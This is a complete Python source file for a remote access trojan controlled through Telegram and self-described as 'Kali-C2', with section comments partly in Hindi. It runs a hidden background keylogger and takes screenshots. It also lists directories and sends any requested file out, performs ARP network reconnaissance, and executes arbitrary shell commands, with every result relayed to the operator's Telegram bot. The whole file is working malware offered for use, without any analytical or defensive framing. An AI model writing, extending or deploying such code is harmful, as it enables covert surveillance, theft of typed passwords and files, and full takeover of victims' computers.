import telebot
import os
import subprocess
import pyautogui
import time
from pynput.keyboard import Listener
import threading

# --- कॉन्फ़िगरेशन (Configuration) ---
TOKEN = 'YOUR_BOT_TOKEN_HERE'
AUTHORIZED_ID = 000000000 

bot = telebot.TeleBot(TOKEN)
log_file = "keylog.txt"

def is_authorized(user_id):
    return user_id == AUTHORIZED_ID

# ==========================================================
# FEATURE 1: KEYLOGGER (Linux/Kali Optimized)
# ==========================================================
def on_press(key):
    try:
        k = str(key.char) if hasattr(key, 'char') else str(key)
        with open(log_file, "a") as f:
            if k == "Key.space": f.write(" ")
            elif k == "Key.enter": f.write("\n")
            elif "Key." in k: f.write(f" [{k}] ")
            else: f.write(k)
    except Exception:
        pass

def start_keylogger():
    # Kali/Linux display access
    if os.name != 'nt' and 'DISPLAY' not in os.environ:
        os.environ['DISPLAY'] = ':0'
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"Keylogger Error: {e}")

threading.Thread(target=start_keylogger, daemon=True).start()

# ==========================================================
# FEATURE 2: MENU
# ==========================================================
@bot.message_handler(commands=['start'])
def welcome(message):
    if is_authorized(message.from_user.id):
        os_type = "Windows" if os.name == 'nt' else "Linux/Kali"
        help_menu = (
            f"🛡️ Kali-C2 Control Active ({os_type})\n\n"
            "📸 /ss - Screenshot\n"
            "⌨️ /keylog - Get Typing Report\n"
            "📁 /ls [path] - List Files\n"
            "📥 /get [path] - Download File\n"
            "💻 Command - Run Terminal Command\n\n"
            "Note: Camera/Video features disabled for Kali optimization."
        )
        bot.reply_to(message, help_menu)

@bot.message_handler(commands=['keylog'])
def send_keylog(message):
    if is_authorized(message.from_user.id):
        if os.path.exists(log_file):
            with open(log_file, 'rb') as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "Keylog file not found yet.")

# ==========================================================
# FEATURE 3: MONITORING (Screenshot)
# ==========================================================
@bot.message_handler(commands=['ss'])
def take_ss(message):
    if is_authorized(message.from_user.id):
        try:
            pyautogui.screenshot("screen.png")
            with open("screen.png", 'rb') as p:
                bot.send_photo(message.chat.id, p)
            os.remove("screen.png")
        except Exception as e:
            bot.reply_to(message, f"Screenshot Error: {e}")

# ==========================================================
# FEATURE 4: FILE ACCESS
# ==========================================================
@bot.message_handler(commands=['ls'])
def list_files(message):
    if is_authorized(message.from_user.id):
        try:
            args = message.text.split(maxsplit=1)
            path = args[1] if len(args) > 1 else "."
            files = os.listdir(path)
            bot.reply_to(message, f"Files in {path}:\n\n" + "\n".join(files[:40]))
        except Exception as e: bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['get'])
def get_file(message):
    if is_authorized(message.from_user.id):
        try:
            file_path = message.text.split(maxsplit=1)[1]
            with open(file_path, 'rb') as f:
                bot.send_document(message.chat.id, f)
        except Exception as e: bot.reply_to(message, f"File Error: {e}")

@bot.message_handler(commands=['net'])
def net_recon(message):
    if is_authorized(message.from_user.id):
        try:
            out = subprocess.check_output("arp -a", shell=True).decode('utf-8')
            bot.send_message(message.chat.id, f"Network Devices:\n\n{out[:4000]}")
        except Exception as e: bot.reply_to(message, f"Network Error: {e}")

# ==========================================================
# FEATURE 5: TERMINAL ACCESS
# ==========================================================
# Global variable to track directory
current_dir = os.getcwd()

@bot.message_handler(func=lambda message: True)
def handle_cmd(message):
    global current_dir
    if is_authorized(message.from_user.id):
        try:
            cmd = message.text
            # Handle CD command separately
            if cmd.startswith("cd "):
                new_path = cmd.split(maxsplit=1)[1]
                target_path = os.path.abspath(os.path.join(current_dir, new_path))
                if os.path.isdir(target_path):
                    current_dir = target_path
                    bot.send_message(message.chat.id, f"📂 Changed Directory to: {current_dir}")
                else:
                    bot.send_message(message.chat.id, f"❌ Error: Directory not found: {new_path}")
                return

            # Run other commands in the current_dir
            process = subprocess.Popen(
                cmd, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                stdin=subprocess.PIPE,
                cwd=current_dir
            )
            out, err = process.communicate()
            result = out.decode('utf-8') + err.decode('utf-8')
            bot.send_message(message.chat.id, result[:4000] or "Command Executed.")
        except Exception as e: bot.reply_to(message, f"Error: {e}")

print("Kali-C2 Bot Starting...")
bot.infinity_polling()
